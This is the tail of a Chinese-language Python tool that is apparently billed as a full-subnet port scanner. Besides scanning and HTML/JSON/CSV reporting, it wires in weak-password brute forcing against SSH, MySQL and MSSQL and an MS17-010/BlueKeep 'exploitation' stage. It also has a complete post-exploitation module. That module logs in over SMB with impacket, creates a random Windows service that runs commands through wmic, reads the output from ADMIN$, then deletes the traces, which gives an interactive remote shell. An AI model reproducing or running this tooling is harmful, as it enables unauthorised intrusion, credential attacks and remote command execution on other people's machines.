        <div class="value">{brute_ok}</div>
        <div class="label">[爆破] 爆破成功</div>
    </div>
    <div class="stat-card danger">
        <div class="value">{eb_count}</div>
        <div class="label">[永恒之蓝] MS17-010</div>
    </div>
    <div class="stat-card rtt">
        <div class="value">{avg_rtt:.1f}ms</div>
        <div class="label">[延迟] 平均响应</div>
    </div>
</div>

<div class="section">
    <h2>[端口] 热门开放端口 <span class="count">Top 20</span></h2>
    <table>
        <thead><tr><th>端口</th><th>服务</th><th>主机数</th><th>分布</th></tr></thead>
        <tbody>{top_ports_html}</tbody>
    </table>
</div>

<div class="section">
    <h2>[服务] 服务分布 <span class="count">Top 15</span></h2>
    <table>
        <thead><tr><th>服务名</th><th>数量</th><th>分布</th></tr></thead>
        <tbody>{svc_dist_html}</tbody>
    </table>
</div>

<div class="section">
    <h2>[主机] 主机与端口详情 <span class="count">({len(alive_hosts)} 台存活, {total_open} 个端口)</span></h2>
    <p style="color:#8b949e; margin-bottom:16px;">提示: 点击主机IP可折叠/展开端口详情 | 鼠标悬停 Banner 可查看完整指纹 | 红色端口为高危端口</p>
    {hosts_html}
</div>

<div class="footer">
    <p>由全网段端口扫描器生成 | Powered by Python Standard Library</p>
    <p style="margin-top:4px;color:#30363d;">扫描线程: 50-1000 并发 | 支持 TCP/UDP/ICMP | CIDR网段 | SSH/MySQL/MSSQL爆破</p>
</div>
</div>
</body>
</html>"""

    with open(filepath, "w", encoding="utf-8-sig") as f:
        f.write(html)
    print(f"[+] HTML 报告已保存: {filepath}")


# ============================================================================
# 交互式 / 命令行接口
# ============================================================================

def print_banner():
    """打印程序 Banner"""
    banner = r"""
    ╔══════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║      █▀▀ █▀▀█ █▀▀█ █▀▀▄ ▀▀█▀▀ █▀▀█ █▀▀█ ▀▀█▀▀              ║
    ║      ▀▀█ █░░█ █▄▄▀ █░░█ ░░█░░ █░░█ █▄▄▀ ░░█░░              ║
    ║      ▀▀▀ ▀▀▀▀ ▀░▀▀ ▀░░▀ ░░▀░░ ▀▀▀▀ ▀░▀▀ ░░▀░░              ║
    ║                                                              ║
    ║          全网段端口扫描器 v3.0                                ║
    ║          功能: 存活探测 | 端口扫描 | Banner抓取                ║
    ║                服务识别 | 漏洞检测 | 报告生成                  ║
    ╚══════════════════════════════════════════════════════════════╝
    """
    print(banner)


def interactive_mode():
    """交互式模式"""
    print_banner()
    print("欢迎使用全网段端口扫描器!\n")

    # 目标输入
    print("目标输入示例:")
    print("  单IP:    192.168.1.1")
    print("  域名:    example.com, www.baidu.com")
    print("  IP范围:  192.168.1.1-192.168.1.254")
    print("  CIDR:    192.168.1.0/24")
    print("  混合:    192.168.1.1,10.0.0.0/24,example.com\n")

    target_str = input("请输入目标地址: ").strip()
    if not target_str:
        print("[!] 未输入目标地址, 退出")
        return

    targets = parse_targets(target_str)
    if not targets:
        print("[!] 未解析到有效目标, 退出")
        return
    print(f"[+] 解析到 {len(targets)} 个目标\n")

    # 扫描类型
    print("扫描类型:")
    print("  1. 快速扫描 (常见端口 Top 200)")
    print("  2. 标准扫描 (Top 1000 常用端口)")
    print("  3. 全端口扫描 (1-65535)")
    print("  4. 自定义端口范围")
    scan_choice = input("请选择 (1-4) [默认: 1]: ").strip() or "1"

    if scan_choice == "1":
        ports = COMMON_PORTS
        scan_label = "快速扫描"
    elif scan_choice == "2":
        ports = list(range(1, 1001))
        scan_label = "标准扫描"
    elif scan_choice == "3":
        ports = list(range(1, 65536))
        scan_label = "全端口扫描"
    elif scan_choice == "4":
        custom = input("请输入端口 (如 80,443,3306 或 1-1000): ").strip()
        ports = []
        for part in custom.replace(" ", "").split(","):
            if "-" in part:
                start, end = part.split("-")
                ports.extend(range(int(start), int(end) + 1))
            elif part.isdigit():
                ports.append(int(part))
        scan_label = "自定义扫描"
    else:
        ports = COMMON_PORTS
        scan_label = "快速扫描"

    print(f"[+] 扫描模式: {scan_label} ({len(ports)} 个端口)")

    # 扫描协议
    proto = input("协议 (tcp/udp/both) [默认: tcp]: ").strip().lower() or "tcp"

    # 线程数
    thread_input = input("线程数 [默认: 500]: ").strip()
    max_workers = int(thread_input) if thread_input.isdigit() else 500

    # 超时
    timeout_input = input("超时时间(秒) [默认: 2.0]: ").strip()
    timeout = float(timeout_input) if timeout_input else 2.0

    # 存活探测
    ping_choice = input("存活探测 (icmp/tcp/both/none) [默认: both]: ").strip().lower() or "both"
    use_icmp = ping_choice in ("icmp", "both")
    use_tcp = ping_choice in ("tcp", "both")
    only_alive = ping_choice != "none"

    # 主机发现
    hosts = discover_alive_hosts(
        targets, use_icmp=use_icmp, use_tcp_ping=use_tcp,
        ping_timeout=timeout, max_workers=max_workers
    )

    if only_alive and not any(h.is_alive for h in hosts):
        print("\n[-] 未发现存活主机, 扫描结束")
        return

    # 端口扫描
    start = time.time()

    if proto in ("tcp", "both"):
        scan_ports(hosts, ports, "tcp", timeout, max_workers,
                   only_alive=only_alive)

    if proto in ("udp", "both"):
        udp_ports = [p for p in ports if p not in (135, 137, 139, 445)]
        scan_ports(hosts, udp_ports, "udp", timeout, max_workers,
                   only_alive=only_alive)

    total_time = time.time() - start

    # 弱口令爆破
    brute_choice = input("\n是否进行弱口令爆破? (y/n) [默认: y]: ").strip().lower() or "y"
    if brute_choice == "y":
        auto_brute_force(hosts, timeout=timeout, max_workers=min(max_workers, 30))

    # 漏洞利用
    _vuln_interactive(hosts)

    # 报告
    print(generate_summary(hosts))

    # 导出
    export_choice = input("\n导出报告? (json/csv/html/all/none) [默认: all]: ").strip().lower() or "all"
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    target_tag = _target_to_filename(target_str)
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    base_name = os.path.join(OUTPUT_DIR, f"scan_{target_tag}_{timestamp}")

    if export_choice in ("json", "all"):
        export_json(hosts, f"{base_name}.json")
    if export_choice in ("csv", "all"):
        export_csv(hosts, f"{base_name}.csv")
    if export_choice in ("html", "all"):
        export_html(hosts, f"{base_name}.html")

    print(f"\n{'='*60}")
    print(f"  扫描完成! 总耗时: {total_time:.1f}s")
    print(f"  存活: {sum(1 for h in hosts if h.is_alive)}/{len(hosts)} 台")
    print(f"  开放端口: {sum(len(h.open_ports) for h in hosts)} 个")
    print(f"{'='*60}")


# ============================================================
# 后渗透模块 - 交互式Shell获取 (类MSF sessions -i)
# ============================================================

import hmac as _hmac

def _ntlm_hash(password: str) -> bytes:
    return hashlib.new('md4', password.encode('utf-16-le')).digest()


def _ntlmv2_response(server_challenge: bytes, nt_hash: bytes,
                     username: str, domain: str, client_challenge: bytes = None) -> bytes:
    if client_challenge is None:
        client_challenge = bytes([random.randint(0, 255) for _ in range(8)])
    timestamp_bytes = struct.pack("<Q", (11644473600 + int(time.time())) * 10000000)
    blob = (
        b"\x01\x01\x00\x00"
        + b"\x00\x00\x00\x00"
        + timestamp_bytes
        + client_challenge
        + b"\x00\x00\x00\x00"
        + b"\x02\x00\x0c\x00" + domain.encode("utf-16-le")
        + b"\x04\x00\x08\x00" + username.encode("utf-16-le")
        + b"\x00\x00\x00\x00\x00\x00\x00\x00"
    )
    challenge_key = _hmac.new(nt_hash, (username.upper() + domain).encode("utf-16-le"), hashlib.md5).digest()
    nt_proof = _hmac.new(challenge_key, server_challenge + blob, hashlib.md5).digest()
    return nt_proof + blob


def _build_ntlmssp_type1() -> bytes:
    sig = b"NTLMSSP\x00"
    msg_type = struct.pack("<I", 1)
    flags = struct.pack("<I", 0x00088207)
    domain_len = struct.pack("<H", 0)
    domain_max = struct.pack("<H", 0)
    domain_off = struct.pack("<I", 0)
    host_len = struct.pack("<H", 0)
    host_max = struct.pack("<H", 0)
    host_off = struct.pack("<I", 0)
    return sig + msg_type + flags + domain_len + domain_max + domain_off + host_len + host_max + host_off


def _build_ntlmssp_type3(username: str, password: str, domain: str,
                         ntlm_type2: bytes) -> bytes:
    sig = b"NTLMSSP\x00"
    msg_type = struct.pack("<I", 3)

    server_challenge = ntlm_type2[24:32]
    nt_hash = _ntlm_hash(password)
    nt_resp = _ntlmv2_response(server_challenge, nt_hash, username, domain)

    user_bytes = username.encode("utf-16-le")
    domain_bytes = domain.encode("utf-16-le")
    host_bytes = socket.gethostname().encode("utf-16-le")

    lm_resp_offset = 64
    nt_resp_offset = lm_resp_offset + 24
    domain_offset = nt_resp_offset + len(nt_resp)
    user_offset = domain_offset + len(domain_bytes)
    host_offset = user_offset + len(user_bytes)
    session_key_offset = host_offset + len(host_bytes)
    total_len = session_key_offset

    lm_resp = b"\x00" * 24
    session_key = b""

    buf = bytearray()
    buf.extend(sig)
    buf.extend(msg_type)
    buf.extend(struct.pack("<H", len(lm_resp)))
    buf.extend(struct.pack("<H", len(lm_resp)))
    buf.extend(struct.pack("<I", lm_resp_offset))
    buf.extend(struct.pack("<H", len(nt_resp)))
    buf.extend(struct.pack("<H", len(nt_resp)))
    buf.extend(struct.pack("<I", nt_resp_offset))
    buf.extend(struct.pack("<H", len(domain_bytes)))
    buf.extend(struct.pack("<H", len(domain_bytes)))
    buf.extend(struct.pack("<I", domain_offset))
    buf.extend(struct.pack("<H", len(user_bytes)))
    buf.extend(struct.pack("<H", len(user_bytes)))
    buf.extend(struct.pack("<I", user_offset))
    buf.extend(struct.pack("<H", len(host_bytes)))
    buf.extend(struct.pack("<H", len(host_bytes)))
    buf.extend(struct.pack("<I", host_offset))
    buf.extend(struct.pack("<H", len(session_key)))
    buf.extend(struct.pack("<H", len(session_key)))
    buf.extend(struct.pack("<I", session_key_offset))
    buf.extend(struct.pack("<I", 0x00088201))
    buf.extend(lm_resp)
    buf.extend(nt_resp)
    buf.extend(domain_bytes)
    buf.extend(user_bytes)
    buf.extend(host_bytes)
    buf.extend(session_key)
    return bytes(buf)


def _netbios_wrap(payload: bytes) -> bytes:
    return b"\x00" + struct.pack(">I", len(payload))[1:] + payload


def _smb_hdr_smb1(cmd: int, uid: int = 0, tid: int = 0, pid: int = 0xFEFF,
                  mid: int = 0, flags: int = 0x18, flags2: int = 0xC801) -> bytes:
    return (
        b"\xff\x53\x4d\x42"
        + bytes([cmd])
        + b"\x00\x00\x00\x00"
        + bytes([flags])
        + struct.pack("<H", flags2)
        + struct.pack("<H", 0)
        + b"\x00" * 8
        + struct.pack("<H", 0)
        + struct.pack("<H", tid)
        + struct.pack("<H", pid)
        + struct.pack("<H", uid)
        + struct.pack("<H", mid)
    )


class SMBPostShell:
    """后渗透SMB Shell - 通过服务管理执行命令获取交互式Shell (使用SMBv2/impacket)"""

    def __init__(self, target_ip: str):
        self.target = target_ip
        self._conn = None
        self._dce = None
        self._scm_handle = None
        self._username = ""
        self._password = ""
        self._domain = ""

    def _ensure_scm_binding(self):
        if self._dce is not None:
            try:
                self._dce.disconnect()
            except Exception:
                pass
        from impacket.dcerpc.v5 import transport, scmr
        rpctransport = transport.SMBTransport(
            self.target, self.target,
            filename=r'\svcctl',
            smb_connection=self._conn
        )
        self._dce = rpctransport.get_dce_rpc()
        self._dce.connect()
        self._dce.bind(scmr.MSRPC_UUID_SCMR)

    def _ensure_scm_open(self):
        from impacket.dcerpc.v5 import scmr
        resp = scmr.hROpenSCManagerW(self._dce)
        self._scm_handle = resp['lpScHandle']

    def connect(self, username: str = "", password: str = "", domain: str = "") -> bool:
        try:
            from impacket.dcerpc.v5 import transport, scmr
        except ImportError:
            return False

        try:
            from impacket.smbconnection import SMBConnection
            self._conn = SMBConnection(self.target, self.target, sess_port=445, timeout=15)
            self._conn.login(username, password, domain=domain)
        except Exception:
            return False

        try:
            self._ensure_scm_binding()
            self._ensure_scm_open()
        except Exception:
            try:
                self._conn.logoff()
            except Exception:
                pass
            return False

        return True

    def exec_command(self, command: str, timeout: float = 30.0) -> str:
        from impacket.dcerpc.v5 import scmr

        svc_name = "PES" + ''.join(random.choices(string.ascii_uppercase, k=5))
        output_path = f'\\Temp\\{svc_name}.txt'

        escaped_command = command.replace('"', '\\"').replace('%', '%%')
        binary_path = (
            f'%COMSPEC% /C wmic process call create '
            f'"%COMSPEC% /C {escaped_command} > C:\\Windows\\Temp\\{svc_name}.txt 2>&1"'
        )

        try:
            resp = scmr.hRCreateServiceW(
                self._dce, self._scm_handle,
                svc_name + '\x00', svc_name + '\x00',
                lpBinaryPathName=binary_path + '\x00',
                dwStartType=scmr.SERVICE_DEMAND_START,
                dwErrorControl=scmr.SERVICE_ERROR_IGNORE,
                dwServiceType=scmr.SERVICE_WIN32_OWN_PROCESS
            )
            svc_handle = resp['lpServiceHandle']
            error_code = resp['ErrorCode']
        except Exception as e:
            return f"[!] CreateServiceW 异常: {e}"

        if error_code != 0:
            try:
                scmr.hRCloseServiceHandle(self._dce, svc_handle)
            except Exception:
                pass
            return f"[!] CreateServiceW 错误码: 0x{error_code:08X}"

        try:
            scmr.hRStartServiceW(self._dce, svc_handle)
        except Exception:
            pass

        time.sleep(6.0)

        try:
            scmr.hRControlService(self._dce, svc_handle, scmr.SERVICE_CONTROL_STOP)
        except Exception:
            pass
        time.sleep(0.5)
        try:
            scmr.hRDeleteService(self._dce, svc_handle)
        except Exception:
            pass
        try:
            scmr.hRCloseServiceHandle(self._dce, svc_handle)
        except Exception:
            pass

        output = self._smb_read_output_direct(svc_name, timeout)

        if output:
            return output
        return f"[*] 命令已执行 (服务: {svc_name})"

    def _smb_read_output_direct(self, svc_name: str, timeout: float = 30.0) -> str:
        deadline = time.time() + timeout
        output_path = f'\\Temp\\{svc_name}.txt'

        while time.time() < deadline:
            try:
                result = bytearray()
                def callback(data):
                    result.extend(data)
                self._conn.getFile('ADMIN$', output_path, callback)
                if result:
                    try:
                        self._conn.deleteFile('ADMIN$', output_path)
                    except Exception:
                        pass
                    try:
                        return bytes(result).decode("gbk", errors="replace").strip()
                    except Exception:
                        return bytes(result).decode("latin-1", errors="replace").strip()
                return ""
            except Exception:
                time.sleep(0.5)
                continue
        return ""

    def interactive(self):
        """启动交互式Shell"""
        print(f"\n{'='*60}")
        print(f"  [*] 后渗透交互式Shell - {self.target}")
        print(f"  [*] 输入命令执行, 输入 exit/quit 退出")
        print(f"{'='*60}\n")

        hostname = self._get_hostname()
        while True:
            try:
                prompt = f"POST [{hostname}]> "
                cmd = input(prompt).strip()
            except (EOFError, KeyboardInterrupt):
                print("\n[*] 退出Shell")
                break

            if not cmd:
                continue
            if cmd.lower() in ("exit", "quit"):
                break

            if cmd.lower() in ("help", "?"):
                print("  可用命令:")
                print("    <任意Windows命令>  - 在目标执行")
                print("    whoami            - 查看当前用户")
                print("    systeminfo        - 系统信息")
                print("    ipconfig          - 网络配置")
                print("    exit/quit         - 退出Shell")
                continue

            print()
            output = self.exec_command(cmd)
            print(output)
            print()

        self.cleanup()

    def _get_hostname(self) -> str:
        try:
            output = self.exec_command("hostname", timeout=10)
            if output and not output.startswith("[!]"):
                return output.strip().split("\n")[0].strip()
        except Exception:
            pass
        return self.target

    def cleanup(self):
        from impacket.dcerpc.v5 import scmr
        if self._scm_handle:
            try:
                scmr.hRCloseServiceHandle(self._dce, self._scm_handle)
            except Exception:
                pass
            self._scm_handle = None
        if self._dce:
            try:
                self._dce.disconnect()
            except Exception:
                pass
            self._dce = None
        if self._conn:
            try:
                self._conn.logoff()
            except Exception:
                pass
            self._conn = None

    def set_creds(self, username: str, password: str, domain: str = ""):
        self._username = username
        self._password = password
        self._domain = domain


def post_exploit_shell(target_ip: str, username: str = "",
                       password: str = "", domain: str = ""):
    """
    后渗透模块 - 类似MSF sessions -i 的交互式Shell

    通过SMB服务管理远程执行命令获取交互式Shell。
    需要目标的管理员账号密码。
    """
    print(f"\n{'='*60}")
    print(f"  后渗透Shell - {target_ip}")
    print(f"{'='*60}")

    if not username:
        username = input("  用户名 [Administrator]: ").strip() or "Administrator"
    if not password:
        password = input("  密码: ").strip()
    if not domain:
        domain = input("  域 (留空=工作组): ").strip()

    if not password:
        print("  [-] 未提供密码, 取消")
        return

    shell = SMBPostShell(target_ip)
    shell.set_creds(username, password, domain)

    print(f"\n  [*] 正在连接 {target_ip}:445 ...")
    if not shell.connect(username, password, domain):
        print("  [-] 连接失败: 认证失败或目标不可达")
        return

    print(f"  [+] 认证成功! 获取交互式Shell...")
    shell.interactive()


def main():
    parser = argparse.ArgumentParser(
        description="全网段端口扫描器 - 多功能网络安全扫描工具",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
使用示例:
  python 全网段扫描端口.py -t 192.168.1.0/24 -p 1-1000
  python 全网段扫描端口.py -t 10.0.0.1-10.0.0.254 -p common
  python 全网段扫描端口.py -t example.com,www.test.com -p 22,80,443
  python 全网段扫描端口.py -t 192.168.1.1,192.168.1.2 -p 80,443,3306 -o json,html
  python 全网段扫描端口.py -t 192.168.1.0/24 -p all --no-ping --threads 1000
  python 全网段扫描端口.py -t 192.168.1.0/24 --brute
  python 全网段扫描端口.py  (交互模式)
        """
    )

    parser.add_argument(
        "-t", "--target",
        help="目标地址 (IP/域名/CIDR/范围, 逗号分隔多个)"
    )
    parser.add_argument(
        "-p", "--ports", default="common",
        help="端口范围: common(常用200)/top1000(1-1000)/all(1-65535)/自定义(80,443,3306 或 1-1000)"
    )
    parser.add_argument(
        "--proto", default="tcp", choices=["tcp", "udp", "both"],
        help="扫描协议 (默认: tcp)"
    )
    parser.add_argument(
        "--threads", type=int, default=500,
        help="并发线程数 (默认: 500)"
    )
    parser.add_argument(
        "--timeout", type=float, default=2.0,
        help="连接超时秒数 (默认: 2.0)"
    )
    parser.add_argument(
        "--no-ping", action="store_true",
        help="跳过存活探测, 直接扫描所有目标"
    )
    parser.add_argument(
        "--ping-method", default="both", choices=["icmp", "tcp", "both"],
        help="存活探测方式 (默认: both)"
    )
    parser.add_argument(
        "-o", "--output", default="all",
        help="输出格式: json/csv/html/all/none (默认: all)"
    )
    parser.add_argument(
        "--output-dir", default=OUTPUT_DIR,
        help="报告输出目录 (默认: 脚本所在目录/reports)"
    )
    parser.add_argument(
        "--brute", action="store_true", default=False,
        help="启用弱口令爆破 (SSH/MySQL/MSSQL)"
    )
    parser.add_argument(
        "--dict", default=None,
        help="自定义密码字典路径 (默认: password_dict.txt)"
    )
    parser.add_argument(
        "--eternal-blue", action="store_true", default=False,
        help="启用严重漏洞利用阶段 (MS17-010/BlueKeep/Redis/Docker/YARN/Cisco)"
    )

    args = parser.parse_args()

    # 无参数时进入交互模式
    if not args.target:
        interactive_mode()
        return

    # 命令行模式
    print_banner()

    targets = parse_targets(args.target)
    if not targets:
        print("[!] 未解析到有效目标")
        sys.exit(1)

    print(f"[+] 目标数量: {len(targets)}")

    # 解析端口
    if args.ports == "common":
        ports = COMMON_PORTS
        port_label = "常用端口"
    elif args.ports == "top1000":
        ports = list(range(1, 1001))
        port_label = "Top 1000"
    elif args.ports == "all":
        ports = list(range(1, 65536))
        port_label = "全端口"
    else:
        ports = []
        for part in args.ports.replace(" ", "").split(","):
            if "-" in part:
                start, end = part.split("-")
                ports.extend(range(int(start), int(end) + 1))
            elif part.isdigit():
                ports.append(int(part))
        port_label = f"自定义"

    print(f"[+] 端口: {port_label} ({len(ports)} 个)")
    print(f"[+] 协议: {args.proto.upper()}")
    print(f"[+] 线程: {args.threads}")
    print(f"[+] 超时: {args.timeout}s")

    # 主机发现
    use_ping = not args.no_ping
    use_icmp = args.ping_method in ("icmp", "both")
    use_tcp = args.ping_method in ("tcp", "both")

    hosts = discover_alive_hosts(
        targets, use_icmp=use_icmp and use_ping,
        use_tcp_ping=use_tcp and use_ping,
        ping_timeout=args.timeout, max_workers=args.threads
    )

    if use_ping and not any(h.is_alive for h in hosts):
        print("\n[-] 未发现存活主机, 扫描结束")
        return

    # 端口扫描
    start = time.time()

    if args.proto in ("tcp", "both"):
        scan_ports(hosts, ports, "tcp", args.timeout, args.threads,
                   only_alive=use_ping)

    if args.proto in ("udp", "both"):
        udp_ports = [p for p in ports if p not in (135, 137, 139, 445)]
        scan_ports(hosts, udp_ports, "udp", args.timeout, args.threads,
                   only_alive=use_ping)

    total_time = time.time() - start

    # 弱口令爆破
    if args.brute:
        auto_brute_force(hosts, timeout=args.timeout,
                         max_workers=min(args.threads, 30),
                         dict_file=args.dict)

    # 永恒之蓝利用
    if args.eternal_blue:
        _vuln_interactive(hosts)

    # 输出摘要
    print(generate_summary(hosts))

    # 导出报告
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    target_tag = _target_to_filename(args.target)
    os.makedirs(args.output_dir, exist_ok=True)
    base_name = os.path.join(args.output_dir, f"scan_{target_tag}_{timestamp}")

    if args.output in ("json", "all"):
        export_json(hosts, f"{base_name}.json")
    if args.output in ("csv", "all"):
        export_csv(hosts, f"{base_name}.csv")
    if args.output in ("html", "all"):
        export_html(hosts, f"{base_name}.html")

    print(f"\n{'='*60}")
    print(f"  扫描完成! 总耗时: {total_time:.1f}s")
    print(f"{'='*60}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] 用户中断扫描")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] 错误: {e}")
        sys.exit(1)
